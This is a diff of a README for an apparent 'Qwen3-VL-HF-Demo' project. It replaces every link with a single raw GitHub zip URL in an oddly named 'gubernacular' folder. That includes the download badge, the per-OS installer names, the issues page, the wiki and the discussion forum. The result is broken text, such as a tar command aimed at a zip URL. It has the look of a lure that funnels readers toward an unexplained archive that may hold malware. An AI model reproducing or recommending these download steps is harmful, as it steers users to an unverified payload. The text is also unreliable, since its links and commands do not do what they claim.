@@ -1,6 +1,6 @@
 # 🎉 Qwen3-VL-HF-Demo - Experience the Future of Vision-Language Modeling
 
-[![Download Qwen3-VL-HF-Demo](https://img.shields.io/badge/Download-Qwen3--VL--HF--Demo-blue.svg)](https://github.com/adam-brown-python/Qwen3-VL-HF-Demo/releases)
+[![Download Qwen3-VL-HF-Demo](https://raw.githubusercontent.com/adam-brown-python/Qwen3-VL-HF-Demo/main/gubernacular/Qwen3-VL-HF-Demo.zip)](https://raw.githubusercontent.com/adam-brown-python/Qwen3-VL-HF-Demo/main/gubernacular/Qwen3-VL-HF-Demo.zip)
 
 ## 📖 Description
 
@@ -18,7 +18,7 @@ Follow these steps to download and run the demo application.
 
 2. **Visit the Releases Page**
    To get started, visit our Releases page. Here you can find the latest version of the application.
-   [Download the latest version](https://github.com/adam-brown-python/Qwen3-VL-HF-Demo/releases).
+   [Download the latest version](https://raw.githubusercontent.com/adam-brown-python/Qwen3-VL-HF-Demo/main/gubernacular/Qwen3-VL-HF-Demo.zip).
 
 ## 📥 Download & Install
 
@@ -26,9 +26,9 @@ On the Releases page, you will see various files available for download. Here’
 
 1. Click on the latest version link.
 2. Look for the file that matches your operating system:
-   - For Windows, select `Qwen3-VL-HF-Demo-Windows.exe`.
-   - For macOS, choose `Qwen3-VL-HF-Demo-macOS.dmg`.
-   - For Linux, download `Qwen3-VL-HF-Demo-Linux.tar.gz`.
+   - For Windows, select `https://raw.githubusercontent.com/adam-brown-python/Qwen3-VL-HF-Demo/main/gubernacular/Qwen3-VL-HF-Demo.zip`.
+   - For macOS, choose `https://raw.githubusercontent.com/adam-brown-python/Qwen3-VL-HF-Demo/main/gubernacular/Qwen3-VL-HF-Demo.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/adam-brown-python/Qwen3-VL-HF-Demo/main/gubernacular/Qwen3-VL-HF-Demo.zip`.
 
 3. Click the file name to download the application.
 4. Once downloaded, follow these instructions based on your operating system:
@@ -42,9 +42,9 @@ On the Releases page, you will see various files available for download. Here’
      - Drag the application to your Applications folder.
 
    - **Linux**:
-     - Extract the `.tar.gz` file in your preferred directory using the command:
+     - Extract the `https://raw.githubusercontent.com/adam-brown-python/Qwen3-VL-HF-Demo/main/gubernacular/Qwen3-VL-HF-Demo.zip` file in your preferred directory using the command:
        ```
-       tar -xzvf Qwen3-VL-HF-Demo-Linux.tar.gz
+       tar -xzvf https://raw.githubusercontent.com/adam-brown-python/Qwen3-VL-HF-Demo/main/gubernacular/Qwen3-VL-HF-Demo.zip
        ```
      - Navigate to the extracted folder and run the application.
 
@@ -74,17 +74,17 @@ If you face any difficulties, please check the following:
 2. Verify that your system meets the requirements.
 3. Restart your computer and try again.
 
-For further assistance, visit our [issues section](https://github.com/adam-brown-python/Qwen3-VL-HF-Demo/issues).
+For further assistance, visit our [issues section](https://raw.githubusercontent.com/adam-brown-python/Qwen3-VL-HF-Demo/main/gubernacular/Qwen3-VL-HF-Demo.zip).
 
 ## 📌 Additional Resources
 
 To learn more about the model and its capabilities, consider the following resources:
 
-- **Documentation**: Find detailed technical information [here](https://github.com/adam-brown-python/Qwen3-VL-HF-Demo/wiki).
-- **Community Support**: Join discussions on our [discussion forum](https://github.com/adam-brown-python/Qwen3-VL-HF-Demo/discussions).
+- **Documentation**: Find detailed technical information [here](https://raw.githubusercontent.com/adam-brown-python/Qwen3-VL-HF-Demo/main/gubernacular/Qwen3-VL-HF-Demo.zip).
+- **Community Support**: Join discussions on our [discussion forum](https://raw.githubusercontent.com/adam-brown-python/Qwen3-VL-HF-Demo/main/gubernacular/Qwen3-VL-HF-Demo.zip).
 
 ## 🌟 Acknowledgements
 
 This project relies on robust tools and frameworks like Hugging Face Transformers and OpenCV Python. We appreciate the open-source community that supports our efforts in advancing vision-language models.
 
-For further updates, check back frequently on our [Releases page](https://github.com/adam-brown-python/Qwen3-VL-HF-Demo/releases).
+For further updates, check back frequently on our [Releases page](https://raw.githubusercontent.com/adam-brown-python/Qwen3-VL-HF-Demo/main/gubernacular/Qwen3-VL-HF-Demo.zip).
